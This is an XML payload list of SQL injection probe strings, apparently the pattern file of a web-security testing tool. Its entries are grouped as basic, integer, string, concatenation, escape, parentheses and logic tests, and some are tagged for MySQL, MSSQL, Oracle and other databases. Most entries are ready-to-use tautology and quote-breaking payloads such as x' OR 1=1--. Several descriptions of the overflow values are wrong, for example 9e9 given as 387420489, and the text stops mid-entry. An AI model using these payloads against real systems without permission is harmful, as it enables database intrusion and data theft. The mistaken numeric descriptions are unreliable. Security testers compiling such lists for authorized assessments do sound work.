<?xml version="1.0"?>
<!-- generated by csv2xml.pl 3.2 from sqlPattern.txt -->
<xss>

<!--
#?!     #?!          - comment line for format description herein
#?!                    Note:  there  must be  at least on empty line after last
#?!                           such comment line and before very first menu line
#?!     #            - comment line, ignored
#?!     LABEL        - special line with label name
#?!                    this is used for all following lines 'til next  LABEL
#?!     DB           - line vallid for specified DB
#?!                    valid values:  Ingress, MSAccess, MSSQL, MySQL, Oracle,
#?!                                   Postgre, TSQL, *
#?!     NAME         - name of pattern
#?!     DESCRIPTION  - description of pattern
#?!     CODE         - SQL pattern
#?!
#?!  Format of XML file:
#?!     <xml>
#?!         <attack>
#?!             <label>LABEL</label>
#?!             <name>NAME</name>
#?!             <code>CODE</code>
#?!             <desc>DESCRIPTION</desc>
#?!             <browser>DB</browser>
#?!         </attack>
#?!     </xml>
 -->

	<attack>
		<label>basic tests</label>
		<name>1=1</name>
		<code>1=1</code>
		<desc>*: 1=1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>basic tests</label>
		<name>x'</name>
		<code>x'</code>
		<desc>*: x'</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>basic tests</label>
		<name>x''</name>
		<code>x''</code>
		<desc>*: x''</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>basic tests</label>
		<name>x')</name>
		<code>x')</code>
		<desc>*: x')</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>basic tests</label>
		<name>x'='x</name>
		<code>x'='x</code>
		<desc>*: x'='x</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>basic tests</label>
		<name>x'='</name>
		<code>x'='</code>
		<desc>*: x'='</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>basic tests</label>
		<name>1%00</name>
		<code>1%00</code>
		<desc>*: 1%00</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>basic tests</label>
		<name>x'%00</name>
		<code>x'%00</code>
		<desc>*: x'%00</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>basic tests</label>
		<name>1\00</name>
		<code>1\00</code>
		<desc>*: 1\00</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>basic tests</label>
		<name>1\\00</name>
		<code>1\\00</code>
		<desc>*: 1\\00</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>basic tests</label>
		<name>x'\\00</name>
		<code>x'\\00</code>
		<desc>*: x'\\00</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>basic tests</label>
		<name>x'\00</name>
		<code>x'\00</code>
		<desc>*: x'\00</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>basic tests</label>
		<name>1%2500</name>
		<code>1%2500</code>
		<desc>*: 1%2500</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>basic tests</label>
		<name>x'%2500</name>
		<code>x'%2500</code>
		<desc>*: x'%2500</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>basic tests</label>
		<name>x' (SELECT * FROM DUAL)--</name>
		<code>x' (SELECT * FROM DUAL)--</code>
		<desc>*: x' (SELECT * FROM DUAL)--</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger tests</label>
		<name>1 AND 1=1</name>
		<code>1 AND 1=1</code>
		<desc>*: 1 AND 1=1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger tests</label>
		<name>1 AND 1=0</name>
		<code>1 AND 1=0</code>
		<desc>*: 1 AND 1=0</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger tests</label>
		<name>1 OR 1=1</name>
		<code>1 OR 1=1</code>
		<desc>*: 1 OR 1=1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger tests</label>
		<name>1 OR 1=0</name>
		<code>1 OR 1=0</code>
		<desc>*: 1 OR 1=0</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger tests</label>
		<name>1 OR 'z'='z</name>
		<code>1 OR 'z'='z</code>
		<desc>*: 1 OR 'z'='z</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger tests</label>
		<name>1 OR 'z'='z'</name>
		<code>1 OR 'z'='z'</code>
		<desc>*: 1 OR 'z'='z'</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger tests</label>
		<name>1 OR 'z'=N'z'</name>
		<code>1 OR 'z'=N'z'</code>
		<desc>MSSQL: 1 OR 'z'=N'z'</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>interger tests</label>
		<name>1 OR (1)=(1)</name>
		<code>1 OR (1)=(1)</code>
		<desc>*: 1 OR (1)=(1)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger tests</label>
		<name>1 OR+1=1</name>
		<code>1 OR+1=1</code>
		<desc>*: 1 OR+1=1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger tests</label>
		<name>1 OR+(1)=(1)</name>
		<code>1 OR+(1)=(1)</code>
		<desc>*: 1 OR+(1)=(1)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger tests</label>
		<name>1 OR+'1'=(1)</name>
		<code>1 OR+'1'=(1)</code>
		<desc>*: 1 OR+'1'=(1)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger tests</label>
		<name>1 OR+'1'=1</name>
		<code>1 OR+'1'=1</code>
		<desc>*: 1 OR+'1'=1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger tests</label>
		<name>1 OR '1'!=0</name>
		<code>1 OR '1'!=0</code>
		<desc>*: 1 OR '1'!=0</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger tests</label>
		<name>1 OR 1 IS NOT NULL</name>
		<code>1 OR 1 IS NOT NULL</code>
		<desc>*: 1 OR 1 IS NOT NULL</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger tests</label>
		<name>1 OR NULL IS NULL</name>
		<code>1 OR NULL IS NULL</code>
		<desc>*: 1 OR NULL IS NULL</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger tests</label>
		<name>1 OR ASCII(2) = ASCII(2)</name>
		<code>1 OR ASCII(2) = ASCII(2)</code>
		<desc>*: 1 OR ASCII(2) = ASCII(2)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>number tests</label>
		<name>0</name>
		<code>0</code>
		<desc>simple test</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>number tests</label>
		<name>-1</name>
		<code>-1</code>
		<desc>simple test</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>number tests</label>
		<name>2</name>
		<code>2</code>
		<desc>simple test</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>number tests</label>
		<name>-2</name>
		<code>-2</code>
		<desc>signed negative</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>number tests</label>
		<name>+2</name>
		<code>+2</code>
		<desc>signed positive</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>number tests</label>
		<name>2e1</name>
		<code>2e1</code>
		<desc>exponential number</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>number tests</label>
		<name>2.1</name>
		<code>2.1</code>
		<desc>deciaml point</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>number tests</label>
		<name>2,1</name>
		<code>2,1</code>
		<desc>deciaml comma</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>number tests</label>
		<name>002</name>
		<code>002</code>
		<desc>ocatl number</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>number tests</label>
		<name>00010</name>
		<code>00010</code>
		<desc>binary number</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger calculation tests</label>
		<name>1+1</name>
		<code>1+1</code>
		<desc>addition</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger calculation tests</label>
		<name>3-1</name>
		<code>3-1</code>
		<desc>subtraction</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger calculation tests</label>
		<name>3/1</name>
		<code>3/1</code>
		<desc>division (ok)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger calculation tests</label>
		<name>3/0</name>
		<code>3/0</code>
		<desc>division (fail)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger calculation tests</label>
		<name>4-3-1</name>
		<code>4-3-1</code>
		<desc>subtraction</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger calculation tests</label>
		<name>4-(3-1)</name>
		<code>4-(3-1)</code>
		<desc>subtraction</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger overflow tests</label>
		<name>10e1</name>
		<code>10e1</code>
		<desc>exponential number</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger overflow tests</label>
		<name>9e9</name>
		<code>9e9</code>
		<desc>387420489</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger overflow tests</label>
		<name>99e9</name>
		<code>99e9</code>
		<desc>913517247483640899</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger overflow tests</label>
		<name>9e29</name>
		<code>9e29</code>
		<desc>4710128697246244834921603689</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger overflow tests</label>
		<name>32768</name>
		<code>32768</code>
		<desc>2^15</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger overflow tests</label>
		<name>32769</name>
		<code>32769</code>
		<desc>2^15 +1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger overflow tests</label>
		<name>65536</name>
		<code>65536</code>
		<desc>2^16</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger overflow tests</label>
		<name>65537</name>
		<code>65537</code>
		<desc>2^16 +1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger overflow tests</label>
		<name>2147483648</name>
		<code>2147483648</code>
		<desc>2^(32-1)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger overflow tests</label>
		<name>2147483649</name>
		<code>2147483649</code>
		<desc>2^(32-1) +1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger overflow tests</label>
		<name>4294967296</name>
		<code>4294967296</code>
		<desc>2^32</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger overflow tests</label>
		<name>4294967297</name>
		<code>4294967297</code>
		<desc>2^32 +1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger overflow tests</label>
		<name>9223372036854775808</name>
		<code>9223372036854775808</code>
		<desc>2^(64-1)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger overflow tests</label>
		<name>9223372036854775809</name>
		<code>9223372036854775809</code>
		<desc>2^(64-1) +1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger overflow tests</label>
		<name>18446744073709551616</name>
		<code>18446744073709551616</code>
		<desc>2^64</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>interger overflow tests</label>
		<name>18446744073709551617</name>
		<code>18446744073709551617</code>
		<desc>2^64 +1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' AND 1=1</name>
		<code>x' AND 1=1</code>
		<desc>*: x' AND 1=1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' AND 1=0</name>
		<code>x' AND 1=0</code>
		<desc>*: x' AND 1=0</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR 1=1</name>
		<code>x' OR 1=1</code>
		<desc>*: x' OR 1=1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR 1=1--</name>
		<code>x' OR 1=1--</code>
		<desc>Oracle: x' OR 1=1--</desc>
		<browser>Oracle</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR 1=0</name>
		<code>x' OR 1=0</code>
		<desc>*: x' OR 1=0</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR 'z'='z</name>
		<code>x' OR 'z'='z</code>
		<desc>*: x' OR 'z'='z</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x" OR "z"="z</name>
		<code>x" OR "z"="z</code>
		<desc>MSSQL: x" OR "z"="z</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR 'z'=N'z'</name>
		<code>x' OR 'z'=N'z'</code>
		<desc>MSSQL: x' OR 'z'=N'z'</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR '1' &amp; 1</name>
		<code>x' OR '1' &amp; 1</code>
		<desc>*: x' OR '1' &amp; 1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR 'z' &amp;&amp; 'z</name>
		<code>x' OR 'z' &amp;&amp; 'z</code>
		<desc>*: x' OR 'z' &amp;&amp; 'z</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR '1' XOR '0</name>
		<code>x' OR '1' XOR '0</code>
		<desc>*: x' OR '1' XOR '0</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR "1" ^ '0</name>
		<code>x' OR "1" ^ '0</code>
		<desc>*: x' OR "1" ^ '0</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR '1' ^ '0</name>
		<code>x' OR '1' ^ '0</code>
		<desc>*: x' OR '1' ^ '0</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR '1'|'2</name>
		<code>x' OR '1'|'2</code>
		<desc>*: x' OR '1'|'2</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR '1' XOR '0</name>
		<code>x' OR '1' XOR '0</code>
		<desc>*: x' OR '1' XOR '0</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR 1&amp;'1</name>
		<code>x' OR 1&amp;'1</code>
		<desc>*: x' OR 1&amp;'1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' HAVING 1 #1 !</name>
		<code>x' HAVING 1 #1 !</code>
		<desc>*: x' HAVING 1 #1 !</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR id=1 HAVING 1 #1 !</name>
		<code>x' OR id=1 HAVING 1 #1 !</code>
		<desc>*: x' OR id=1 HAVING 1 #1 !</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR id=+1 HAVING 1 #1 !</name>
		<code>x' OR id=+1 HAVING 1 #1 !</code>
		<desc>*: x' OR id=+1 HAVING 1 #1 !</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR username REGEXP 'admi*' HAVIN</name>
		<code>x' OR username REGEXP 'admi*' HAVING 1 #1 !</code>
		<desc>*: x' OR username REGEXP 'admi*' HAVING 1 #1 !</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR username=0x61646D696E; #a !</name>
		<code>x' OR username=0x61646D696E; #a !</code>
		<desc>*: x' OR username=0x61646D696E; #a !</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR IF(-1=-1,true,false)#!</name>
		<code>x' OR IF(-1=-1,true,false)#!</code>
		<desc>MySQL: x' OR IF(-1=-1,true,false)#!</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR IF(1=1) SELECT 'true' ELSE SE</name>
		<code>x' OR IF(1=1) SELECT 'true' ELSE SELECT 'false'</code>
		<desc>MSSQL: x' OR IF(1=1) SELECT 'true' ELSE SELECT 'false'</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR column='1</name>
		<code>x' OR column='1</code>
		<desc>*: x' OR column='1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR column!='1</name>
		<code>x' OR column!='1</code>
		<desc>*: x' OR column!='1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR column DIV null IS NULL #(</name>
		<code>x' OR column DIV null IS NULL #(</code>
		<desc>*: x' OR column DIV null IS NULL #(</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR column+(1)='1</name>
		<code>x' OR column+(1)='1</code>
		<desc>*: x' OR column+(1)='1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR id SOUNDS LIKE'\'</name>
		<code>x' OR id SOUNDS LIKE'\'</code>
		<desc>*: x' OR id SOUNDS LIKE'\'</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR LOCALTIME!='0</name>
		<code>x' OR LOCALTIME!='0</code>
		<desc>*: x' OR LOCALTIME!='0</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR BINARY 1= '1</name>
		<code>x' OR BINARY 1= '1</code>
		<desc>*: x' OR BINARY 1= '1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR current_user!=' 1</name>
		<code>x' OR current_user!=' 1</code>
		<desc>*: x' OR current_user!=' 1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x'='x</name>
		<code>x'='x</code>
		<desc>MySQL: x'='x</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x'='</name>
		<code>x'='</code>
		<desc>MySQL: x'='</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' LIKE'0</name>
		<code>x' LIKE'0</code>
		<desc>MySQL: x' LIKE'0</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' REGEXP/RLIKE BINARY 0#(</name>
		<code>x' REGEXP/RLIKE BINARY 0#(</code>
		<desc>MySQL: x' REGEXP/RLIKE BINARY 0#(</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' SOUNDS LIKE+'1</name>
		<code>x' SOUNDS LIKE+'1</code>
		<desc>MySQL: x' SOUNDS LIKE+'1</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR CURRENT_TIME!='0</name>
		<code>x' OR CURRENT_TIME!='0</code>
		<desc>MySQL: x' OR CURRENT_TIME!='0</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' OR CURRENT_TIMESTAMP!='0</name>
		<code>x' OR CURRENT_TIMESTAMP!='0</code>
		<desc>MySQL: x' OR CURRENT_TIMESTAMP!='0</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x'!=LOCALTIMESTAMP #(</name>
		<code>x'!=LOCALTIMESTAMP #(</code>
		<desc>MySQL: x'!=LOCALTIMESTAMP #(</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x' IN (0)#(</name>
		<code>x' IN (0)#(</code>
		<desc>MySQL: x' IN (0)#(</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>string tests</label>
		<name>x'!=ASCII(1)#</name>
		<code>x'!=ASCII(1)#</code>
		<desc>MySQL: x'!=ASCII(1)#</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>string concat tests</label>
		<name>x'||'y</name>
		<code>x'||'y</code>
		<desc>DB2: x'||'y</desc>
		<browser>DB2</browser>
	</attack>
	<attack>
		<label>string concat tests</label>
		<name>x''y</name>
		<code>x''y</code>
		<desc>MySQL: x''y</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>string concat tests</label>
		<name>x'+'y</name>
		<code>x'+'y</code>
		<desc>MySQL: x'+'y</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>string concat tests</label>
		<name>x'+'y</name>
		<code>x'+'y</code>
		<desc>MSSQL: x'+'y</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>string concat tests</label>
		<name>x'||'y</name>
		<code>x'||'y</code>
		<desc>Oracle: x'||'y</desc>
		<browser>Oracle</browser>
	</attack>
	<attack>
		<label>string concat tests</label>
		<name>x'||'y</name>
		<code>x'||'y</code>
		<desc>Postgre: x'||'y</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>string concat tests</label>
		<name>x'||'y</name>
		<code>x'||'y</code>
		<desc>SQLite: x'||'y</desc>
		<browser>SQLite</browser>
	</attack>
	<attack>
		<label>string concat tests</label>
		<name>x'||'y</name>
		<code>x'||'y</code>
		<desc>Sybase: x'||'y</desc>
		<browser>Sybase</browser>
	</attack>
	<attack>
		<label>string concat tests</label>
		<name>x'+'y</name>
		<code>x'+'y</code>
		<desc>Sybase: x'+'y</desc>
		<browser>Sybase</browser>
	</attack>
	<attack>
		<label>string concat tests</label>
		<name>Basic</name>
		<code>Basic</code>
		<desc>VisualB: Basic</desc>
		<browser>VisualB</browser>
	</attack>
	<attack>
		<label>string concat tests</label>
		<name>select 'x' concat 'y'</name>
		<code>select 'x' concat 'y'</code>
		<desc>common SQL</desc>
		<browser>DB2</browser>
	</attack>
	<attack>
		<label>string concat tests</label>
		<name>select concat('x','y')</name>
		<code>select concat('x','y')</code>
		<desc>common SQL</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>string concat tests</label>
		<name>select concat("x","y")</name>
		<code>select concat("x","y")</code>
		<desc>common SQL</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>string concat tests</label>
		<name>select concat('x','y')</name>
		<code>select concat('x','y')</code>
		<desc>common SQL</desc>
		<browser>Oracle</browser>
	</attack>
	<attack>
		<label>escape tests</label>
		<name>x\'1</name>
		<code>x\'1</code>
		<desc>*: x\'1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>escape tests</label>
		<name>x\\'1</name>
		<code>x\\'1</code>
		<desc>*: x\\'1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>parantheses tests</label>
		<name>1) OR 1=1</name>
		<code>1) OR 1=1</code>
		<desc>*: 1) OR 1=1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>parantheses tests</label>
		<name>x') OR 1=1</name>
		<code>x') OR 1=1</code>
		<desc>*: x') OR 1=1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>parantheses tests</label>
		<name>x') OR 1 &gt; 2 #</name>
		<code>x') OR 1 &gt; 2 #</code>
		<desc>*: x') OR 1 &gt; 2 #</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>parantheses tests</label>
		<name>x') OR ('x'='x</name>
		<code>x') OR ('x'='x</code>
		<desc>*: x') OR ('x'='x</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>parantheses tests</label>
		<name>x") OR ("x"="x</name>
		<code>x") OR ("x"="x</code>
		<desc>*: x") OR ("x"="x</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>1 OR ASCII(2) = ASCII(2)</name>
		<code>1 OR ASCII(2) = ASCII(2)</code>
		<desc>*: 1 OR ASCII(2) = ASCII(2)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>1 OR BIN(2) = BIN(2)</name>
		<code>1 OR BIN(2) = BIN(2)</code>
		<desc>*: 1 OR BIN(2) = BIN(2)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>1 OR HEX(2) = HEX(2)</name>
		<code>1 OR HEX(2) = HEX(2)</code>
		<desc>*: 1 OR HEX(2) = HEX(2)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>1 OR MD5(2) = MD5(2)</name>
		<code>1 OR MD5(2) = MD5(2)</code>
		<desc>*: 1 OR MD5(2) = MD5(2)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>1 OR SPACE(2) = SPACE(2)</name>
		<code>1 OR SPACE(2) = SPACE(2)</code>
		<desc>*: 1 OR SPACE(2) = SPACE(2)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>1 OR USER(2) = USER(2)</name>
		<code>1 OR USER(2) = USER(2)</code>
		<desc>*: 1 OR USER(2) = USER(2)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>1 OR VERSION(2) = VERSION(2)</name>
		<code>1 OR VERSION(2) = VERSION(2)</code>
		<desc>*: 1 OR VERSION(2) = VERSION(2)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>1 OR bit_lengtrh(2) = bit_lengtrh(2</name>
		<code>1 OR bit_lengtrh(2) = bit_lengtrh(2)</code>
		<desc>*: 1 OR bit_lengtrh(2) = bit_lengtrh(2)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>and 1=1-(True)</name>
		<code>and 1=1-(True)</code>
		<desc>*: and 1=1-(True)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>and 1=2-(False)</name>
		<code>and 1=2-(False)</code>
		<desc>*: and 1=2-(False)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x'IS\N - '1</name>
		<code>x'IS\N - '1</code>
		<desc>MySQL: x'IS\N - '1</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' IS \N - '1</name>
		<code>x' IS \N - '1</code>
		<desc>MySQL: x' IS \N - '1</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' IS\N|!'</name>
		<code>x' IS\N|!'</code>
		<desc>MySQL: x' IS\N|!'</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' IS \N OR '1</name>
		<code>x' IS \N OR '1</code>
		<desc>*: x' IS \N OR '1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' IS \N|! '</name>
		<code>x' IS \N|! '</code>
		<desc>*: x' IS \N|! '</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' IS \N - ! '</name>
		<code>x' IS \N - ! '</code>
		<desc>*: x' IS \N - ! '</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' IS \N = '</name>
		<code>x' IS \N = '</code>
		<desc>*: x' IS \N = '</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' OR null IS null #</name>
		<code>x' OR null IS null #</code>
		<desc>*: x' OR null IS null #</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' OR-1='-1</name>
		<code>x' OR-1='-1</code>
		<desc>*: x' OR-1='-1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' OR!1='!1</name>
		<code>x' OR!1='!1</code>
		<desc>*: x' OR!1='!1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' OR!(1)='1</name>
		<code>x' OR!(1)='1</code>
		<desc>*: x' OR!(1)='1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' OR@1='@1</name>
		<code>x' OR@1='@1</code>
		<desc>*: x' OR@1='@1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' OR-1 XOR'0</name>
		<code>x' OR-1 XOR'0</code>
		<desc>*: x' OR-1 XOR'0</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' OR ASCII(1)='49</name>
		<code>x' OR ASCII(1)='49</code>
		<desc>*: x' OR ASCII(1)='49</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' OR MD5(1)^'1</name>
		<code>x' OR MD5(1)^'1</code>
		<desc>*: x' OR MD5(1)^'1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' OR MD5(5)^'1</name>
		<code>x' OR MD5(5)^'1</code>
		<desc>*: x' OR MD5(5)^'1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' OR!'a</name>
		<code>x' OR!'a</code>
		<desc>*: x' OR!'a</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' OR!'0</name>
		<code>x' OR!'0</code>
		<desc>*: x' OR!'0</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' OR-'1</name>
		<code>x' OR-'1</code>
		<desc>*: x' OR-'1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' OR@'1' IS NULL #1 !</name>
		<code>x' OR@'1' IS NULL #1 !</code>
		<desc>*: x' OR@'1' IS NULL #1 !</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' OR!(false) #1 !</name>
		<code>x' OR!(false) #1 !</code>
		<desc>*: x' OR!(false) #1 !</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' OR-(true) #a !</name>
		<code>x' OR-(true) #a !</code>
		<desc>*: x' OR-(true) #a !</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x'!='0</name>
		<code>x'!='0</code>
		<desc>MySQL: x'!='0</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' !=' 0</name>
		<code>x' !=' 0</code>
		<desc>*: x' !=' 0</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
